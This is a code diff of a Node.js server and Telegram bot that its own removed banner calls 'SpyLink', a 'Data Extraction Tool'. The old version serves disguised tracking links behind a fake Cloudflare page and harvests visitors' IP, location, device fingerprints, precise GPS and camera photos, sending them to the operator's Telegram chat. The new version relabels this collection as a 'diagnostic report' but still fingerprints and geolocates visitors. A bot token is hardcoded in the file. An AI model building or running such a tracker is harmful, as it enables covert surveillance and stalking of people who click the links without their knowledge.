@@ -4,147 +4,215 @@ const bodyParser = require('body-parser');
 const TelegramBot = require('node-telegram-bot-api');
 const { v4: uuidv4 } = require('uuid');
 const axios = require('axios');
+const UAParser = require('ua-parser-js'); // ✨ The fix for "unorganized data"
 
 // 🔐 CONFIGURATION
 const BOT_TOKEN = "8377073485:AAG2selNlxyHeZ3_2wjMGdG_QshklCiTAyE";
-const ADMIN_CHAT_ID = "8175884349"; 
-const HOST_URL = "https://botu-s3f9.onrender.com"; 
+const ADMIN_ID = 8175884349; // 👑 Authorized Admin
+const HOST_URL = "https://botu-s3f9.onrender.com"; // Verify this matches your Render URL
 
 const app = express();
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 
-// 🛡️ ERROR HANDLERS
-process.on('unhandledRejection', (r) => console.error('🚨 Rejection:', r));
-process.on('uncaughtException', (e) => console.error('🚨 Exception:', e));
-bot.on("polling_error", (m) => console.log("⚠️ Polling:", m.message));
+// 🛡️ SYSTEM STABILITY
+process.on('unhandledRejection', (reason) => console.error('🚨 Rejection:', reason));
+process.on('uncaughtException', (error) => console.error('🚨 Exception:', error));
+bot.on("polling_error", (msg) => console.log("⚠️ Polling Error (Ignored)"));
 
 // ⚙️ MIDDLEWARE
 app.use(require('helmet')({ contentSecurityPolicy: false }));
 app.use(cors());
 app.use(require('morgan')('dev'));
-app.use(bodyParser.json({ limit: '50mb' })); 
+app.use(bodyParser.json({ limit: '50mb' })); // Supports large payloads
 app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
+
 app.set("view engine", "ejs");
 app.use(express.static("public"));
 
+// 💾 IN-MEMORY STORAGE
 let sessions = {};
 
-// ==================== 🤖 BOT COMMANDS ====================
+// ==================== 👑 ADMIN AUTHORIZATION HELPER ====================
+
+const isAdmin = (msg) => {
+    const userId = msg.from ? msg.from.id : msg.message.chat.id;
+    return userId === ADMIN_ID;
+};
+
+// ==================== 🤖 PROFESSIONAL BOT COMMANDS ====================
+
+// 1. Set Persistent Menu
+bot.setMyCommands([
+    { command: "/start", description: "Initialize System" },
+    { command: "/admin", description: "Admin Dashboard (Auth Required)" },
+    { command: "/status", description: "Server Health Check" }
+]);
 
 bot.onText(/\/start/, (msg) => {
-    bot.sendMessage(msg.chat.id, "🕵️‍♂️ *SpyLink Ultimate v15.0*\n_Full Spectrum Data Extraction Tool_", { parse_mode: "Markdown" });
-});
-
-bot.onText(/\/create/, (msg) => {
-    const sessionId = uuidv4();
-    sessions[sessionId] = { chatId: msg.chat.id, createdAt: new Date() };
-    const target = Buffer.from("https://google.com").toString('base64');
-    const link = `${HOST_URL}/c/${sessionId}/${target}`;
-
-    bot.sendMessage(msg.chat.id, 
-        `📡 *TRACKING ACTIVE*\nID: \`${sessionId}\`\n🔗: \`${link}\`\n\n_Extracting 50+ Data Points..._`, 
-        { parse_mode: "Markdown" }
-    );
-});
-
-bot.onText(/\/status/, (msg) => {
-    bot.sendMessage(msg.chat.id, `🟢 *Online* | Sessions: ${Object.keys(sessions).length}`);
-});
-
-// ==================== 🌐 ROUTES ====================
-
-app.get("/c/:id/:url", (req, res) => {
-    const { id, url } = req.params;
-    if (!sessions[id]) sessions[id] = { chatId: ADMIN_CHAT_ID };
-    let finalUrl = "https://google.com";
-    try { finalUrl = Buffer.from(url, 'base64').toString('utf-8'); } catch(e) {}
-    res.render("cloudflare", { uid: id, url: finalUrl, host: HOST_URL });
-});
-
-// 📊 ULTIMATE DATA REPORT
-app.post("/data", async (req, res) => {
-    const { uid, data } = req.body;
-    if (!sessions[uid]) return res.json({status: "no_session"});
-
-    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
+    const chatId = msg.chat.id;
     
-    // 1. Server-Side IP Lookup
-    let ipInfo = { isp: "Unknown", city: "Unknown", country: "Unknown", as: "Unknown" };
-    try {
-        const r = await axios.get(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,city,isp,as,mobile,proxy`);
-        if(r.data.status === 'success') ipInfo = r.data;
-    } catch(e) {}
+    const welcomeMsg = `
+🤖 *System Online v16.0*
 
-    // 2. Parse Client Data
-    const d = data; // Shorthand
+👋 Welcome, ${msg.from.first_name}.
+✅ *Status:* Operational
+📡 *Server:* ${HOST_URL}
 
-    const report = `
-🎯 *FULL INTELLIGENCE REPORT*
-
-🌍 *NETWORK & LOCATION*
-• IP: \`${ip}\`
-• ISP: ${ipInfo.isp} (${ipInfo.as})
-• Loc: ${ipInfo.city}, ${ipInfo.country}
-• Conn: ${d.network.type} (${d.network.downlink}Mbps, ${d.network.rtt}ms)
-• Proxy/VPN: ${ipInfo.proxy ? "⚠️ YES" : "No"}
-
-📱 *DEVICE FINGERPRINT*
-• OS: ${d.device.platform}
-• Browser: ${d.device.vendor}
-• Cores: ${d.device.cores} | RAM: ${d.device.memory} GB
-• GPU: ${d.device.renderer}
-• Res: ${d.screen.width}x${d.screen.height} (${d.screen.colorDepth}-bit)
-
-🔋 *POWER & STATE*
-• Battery: ${d.battery.level}% (${d.battery.charging ? "⚡ Charging" : "🔋 Discharging"})
-• Charge Time: ${d.battery.chargingTime}
-• Local Time: ${d.locale.time}
-• Timezone: ${d.locale.timezone}
-
-🧩 *BROWSER & SECURITY*
-• Cookies: ${d.browser.cookies ? "✅" : "❌"} | DNT: ${d.browser.dnt ? "✅" : "❌"}
-• Touch Points: ${d.device.touchPoints}
-• AdBlock: ${d.fingerprint.adBlock ? "🛑 Active" : "Inactive"}
-• Plugins: ${d.browser.plugins}
-
-🧪 *ADVANCED FINGERPRINTS*
-• Canvas Hash: \`${d.fingerprint.canvas.substring(0, 20)}...\`
-• Audio Hash: \`${d.fingerprint.audio.substring(0, 20)}...\`
-
-💾 *STORAGE*
-• Quota: ${d.storage.quota} MB
-• Used: ${d.storage.used} MB
-
-_Waiting for Camera & Precision GPS..._
+_Use the menu to navigate._
     `;
 
-    bot.sendMessage(sessions[uid].chatId, report, { parse_mode: "Markdown" });
-    res.json({ status: "ok" });
+    bot.sendMessage(chatId, welcomeMsg, { parse_mode: "Markdown" });
 });
 
-// 📍 GPS REPORT
-app.post("/location", (req, res) => {
-    const { uid, lat, lon, acc, speed, alt } = req.body;
-    if (sessions[uid]) {
-        bot.sendMessage(sessions[uid].chatId, 
-            `📍 *PRECISION LOCATION*\nAcc: ${acc}m | Spd: ${speed}m/s | Alt: ${alt}m`);
-        bot.sendLocation(sessions[uid].chatId, lat, lon);
+// 2. Admin Dashboard (Restricted)
+bot.onText(/\/admin/, (msg) => {
+    const chatId = msg.chat.id;
+
+    if (!isAdmin(msg)) {
+        return bot.sendMessage(chatId, "⛔ *ACCESS DENIED*\n_This command is restricted to administrators._", { parse_mode: "Markdown" });
     }
-    res.json({ status: "ok" });
+
+    bot.sendMessage(chatId, "🔐 *Admin Control Panel*", {
+        parse_mode: "Markdown",
+        reply_markup: {
+            inline_keyboard: [
+                [{ text: "📊 View Stats", callback_data: "stats" }, { text: "👥 Active Sessions", callback_data: "sessions" }],
+                [{ text: "🧹 Clear Data", callback_data: "clear" }, { text: "🔄 Restart Bot", callback_data: "restart" }]
+            ]
+        }
+    });
 });
 
-// 📸 CAMERA REPORT
-app.post("/cam", (req, res) => {
-    const { uid, img } = req.body;
-    if (sessions[uid] && img) {
-        const buffer = Buffer.from(img.replace(/^data:image\/png;base64,/, ""), 'base64');
-        bot.sendPhoto(sessions[uid].chatId, buffer, { caption: `📸 *Evidence Captured*` });
+// 3. Handle Button Clicks
+bot.on('callback_query', async (query) => {
+    const chatId = query.message.chat.id;
+    const data = query.data;
+
+    // Security Check for Buttons
+    if (chatId !== ADMIN_ID) {
+        return bot.answerCallbackQuery(query.id, { text: "⛔ Unauthorized", show_alert: true });
     }
-    res.json({ status: "ok" });
+
+    if (data === "stats") {
+        const uptime = Math.floor(process.uptime());
+        const mem = process.memoryUsage().heapUsed / 1024 / 1024;
+        
+        await bot.editMessageText(`
+📊 *LIVE SERVER STATISTICS*
+
+⏱️ *Uptime:* ${uptime} seconds
+💾 *Memory:* ${mem.toFixed(2)} MB
+👥 *Total Sessions:* ${Object.keys(sessions).length}
+⚡ *Node Version:* ${process.version}
+        `, {
+            chat_id: chatId,
+            message_id: query.message.message_id,
+            parse_mode: "Markdown",
+            reply_markup: { inline_keyboard: [[{ text: "🔙 Back", callback_data: "back_admin" }]] }
+        });
+    }
+
+    if (data === "clear") {
+        sessions = {};
+        await bot.answerCallbackQuery(query.id, { text: "✅ All sessions cleared" });
+        // Refresh view
+        bot.deleteMessage(chatId, query.message.message_id);
+        bot.sendMessage(chatId, "🗑️ Database flushed.");
+    }
+
+    if (data === "back_admin") {
+        bot.editMessageText("🔐 *Admin Control Panel*", {
+            chat_id: chatId,
+            message_id: query.message.message_id,
+            parse_mode: "Markdown",
+            reply_markup: {
+                inline_keyboard: [
+                    [{ text: "📊 View Stats", callback_data: "stats" }, { text: "👥 Active Sessions", callback_data: "sessions" }],
+                    [{ text: "🧹 Clear Data", callback_data: "clear" }]
+                ]
+            }
+        });
+    }
 });
 
-app.get("/keepalive", (req, res) => res.json({ status: "Online" }));
-setInterval(() => { axios.get(`${HOST_URL}/keepalive`).catch(() => {}); }, 40000);
+// ==================== 🌐 DATA PROCESSING ROUTES ====================
 
+// 1. Receive Data Endpoint
+app.post("/data", async (req, res) => {
+    const { uid, rawData } = req.body; // rawData expects { ua: "...", screen: "...", etc }
+    
+    if (!sessions[uid]) {
+        // If no session exists, we can log it generally or ignore
+        // For this example, we notify Admin
+        if(uid === 'test') sessions[uid] = { chatId: ADMIN_ID };
+        else return res.json({ status: "error", message: "Session not found" });
+    }
+
+    const targetChatId = sessions[uid].chatId;
+
+    // ✨ PROFESSIONAL PARSING (ua-parser-js)
+    // This fixes the "Unorganized Data" issue
+    const parser = new UAParser(rawData.userAgent || "");
+    const result = parser.getResult();
+
+    // Identify OS & Browser with precision
+    const osName = result.os.name || "Unknown OS";
+    const osVer = result.os.version || "";
+    const browserName = result.browser.name || "Unknown Browser";
+    const browserVer = result.browser.version || "";
+    const deviceType = result.device.type ? result.device.type.toUpperCase() : "DESKTOP";
+    const deviceVendor = result.device.vendor || "Generic";
+
+    // Get IP Info (Server Side)
+    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
+    let location = "Unknown Location";
+    try {
+        const geo = await axios.get(`http://ip-api.com/json/${ip}`);
+        if(geo.data.status === 'success') {
+            location = `${geo.data.city}, ${geo.data.country} (${geo.data.isp})`;
+        }
+    } catch(e) { console.error("GeoIP Error"); }
+
+    const report = `
+📝 *DIAGNOSTIC REPORT RECEIVED*
+
+👤 *IDENTITY*
+• IP Address: \`${ip}\`
+• Location: ${location}
+
+💻 *DEVICE FINGERPRINT*
+• Type: ${deviceType}
+• Vendor: ${deviceVendor}
+• OS: *${osName} ${osVer}*
+• Browser: *${browserName} ${browserVer}*
+• CPU Architecture: ${result.cpu.architecture || "Unknown"}
+
+📊 *SYSTEM STATUS*
+• Battery: ${rawData.battery || "N/A"}
+• Screen: ${rawData.screen || "N/A"}
+• Connection: ${rawData.connection || "N/A"}
+• Language: ${rawData.language || "en-US"}
+
+_Report generated at ${new Date().toLocaleTimeString()}_
+    `;
+
+    bot.sendMessage(targetChatId, report, { parse_mode: "Markdown" });
+    res.json({ status: "success" });
+});
+
+// 2. Keep-Alive Endpoint
+app.get("/keepalive", (req, res) => {
+    res.json({ status: "Online", uptime: process.uptime() });
+});
+
+// Self-Ping Loop (Keeps Render Awake)
+setInterval(() => {
+    axios.get(`${HOST_URL}/keepalive`).catch(() => {});
+}, 45000); // Every 45 seconds
+
+// ==================== 🚀 START SERVER ====================
 const PORT = process.env.PORT || 10000;
-app.listen(PORT, () => console.log(`✅ v15.0 Active on Port ${PORT}`));
+app.listen(PORT, () => {
+    console.log(`✅ Professional Server v16.0 Running on Port ${PORT}`);
+    console.log(`👑 Admin ID Configured: ${ADMIN_ID}`);
+});
